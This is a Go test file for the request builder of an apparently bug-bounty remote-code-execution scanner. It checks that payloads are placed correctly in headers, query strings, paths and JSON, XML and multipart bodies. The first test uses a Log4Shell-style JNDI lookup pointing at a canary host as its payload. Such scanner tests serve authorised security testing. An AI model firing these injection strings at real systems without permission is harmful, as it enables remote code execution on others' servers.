package engine_test

import (
	"context"
	"io"
	"net/url"
	"testing"

	"github.com/bugbountytool/rce-finder/internal/engine"
	"github.com/bugbountytool/rce-finder/internal/requestbody"
	"github.com/bugbountytool/rce-finder/internal/template"
)

func TestBuildRequestPlacesPayloadInHeadersQueryAndBody(t *testing.T) {
	target, _ := url.Parse("https://example.test/base?existing=yes")
	tmpl := &template.Template{
		Method: "POST", PathTemplate: "submit",
		InjectionPoints: []template.InjectionPoint{
			{Location: "header", Name: "X-Probe"}, {Location: "query", Name: "q"}, {Location: "body", Name: "input"},
		},
	}
	const payload = "${jndi:ldap://canary.test/a}"
	req, err := engine.BuildRequest(context.Background(), target, tmpl, payload, requestbody.MaxBytes)
	if err != nil {
		t.Fatal(err)
	}
	if req.Method != "POST" || req.URL.Path != "/base/submit" || req.URL.Query().Get("q") != payload || req.URL.Query().Get("existing") != "yes" {
		t.Fatalf("request URL/method = %s %s", req.Method, req.URL)
	}
	if req.Header.Get("X-Probe") != payload || req.Header.Get("Content-Type") != "application/x-www-form-urlencoded" {
		t.Fatalf("headers = %#v", req.Header)
	}
	body, _ := io.ReadAll(req.Body)
	if got := string(body); got != "input=%24%7Bjndi%3Aldap%3A%2F%2Fcanary.test%2Fa%7D" {
		t.Fatalf("body = %q", got)
	}
}

func TestBuildRequestPlacesPayloadInPath(t *testing.T) {
	target, _ := url.Parse("https://example.test/api")
	tmpl := &template.Template{PathTemplate: "v1/{{inject}}", InjectionPoints: []template.InjectionPoint{{Location: "path"}}}
	req, err := engine.BuildRequest(context.Background(), target, tmpl, "canary.test", requestbody.MaxBytes)
	if err != nil {
		t.Fatal(err)
	}
	if req.URL.Path != "/api/v1/canary.test" {
		t.Fatalf("path = %q", req.URL.Path)
	}
}

func TestBuildRequestPlacesPayloadInJSONBody(t *testing.T) {
	target, _ := url.Parse("https://example.test/api")
	tmpl := &template.Template{Method: "POST", BodyContentType: "application/json", InjectionPoints: []template.InjectionPoint{{Location: "body", Name: "input"}}}
	req, err := engine.BuildRequest(context.Background(), target, tmpl, "canary.test", requestbody.MaxBytes)
	if err != nil {
		t.Fatal(err)
	}
	body, _ := io.ReadAll(req.Body)
	if req.Header.Get("Content-Type") != "application/json" || string(body) != `{"input":"canary.test"}` {
		t.Fatalf("JSON request = content-type %q body %q", req.Header.Get("Content-Type"), body)
	}
}

func TestBuildRequestTypedBodyGolden(t *testing.T) {
	target, _ := url.Parse("https://example.test/api")
	xmlTemplate := &template.Template{Method: "POST", BodyContentType: "application/xml", BodyFields: []requestbody.Field{{Name: "request.input"}}, InjectionPoints: []template.InjectionPoint{{Location: "body", Name: "request.input"}}}
	req, err := engine.BuildRequest(context.Background(), target, xmlTemplate, "canary<&", requestbody.MaxBytes)
	if err != nil {
		t.Fatal(err)
	}
	body, _ := io.ReadAll(req.Body)
	if req.Header.Get("Content-Type") != "application/xml" || string(body) != "<request><input>canary&lt;&amp;</input></request>" {
		t.Fatalf("XML request = %q %q", req.Header.Get("Content-Type"), body)
	}
	multipartTemplate := &template.Template{Method: "POST", BodyContentType: "multipart/form-data", MultipartBoundary: "rce-finder-test", BodyFields: []requestbody.Field{{Name: "input"}}, InjectionPoints: []template.InjectionPoint{{Location: "body", Name: "input"}}}
	req, err = engine.BuildRequest(context.Background(), target, multipartTemplate, "canary.test", requestbody.MaxBytes)
	if err != nil {
		t.Fatal(err)
	}
	body, _ = io.ReadAll(req.Body)
	want := "--rce-finder-test\r\nContent-Disposition: form-data; name=\"input\"\r\n\r\ncanary.test\r\n--rce-finder-test--\r\n"
	if req.Header.Get("Content-Type") != "multipart/form-data; boundary=rce-finder-test" || string(body) != want {
		t.Fatalf("multipart request = %q %q", req.Header.Get("Content-Type"), body)
	}
}
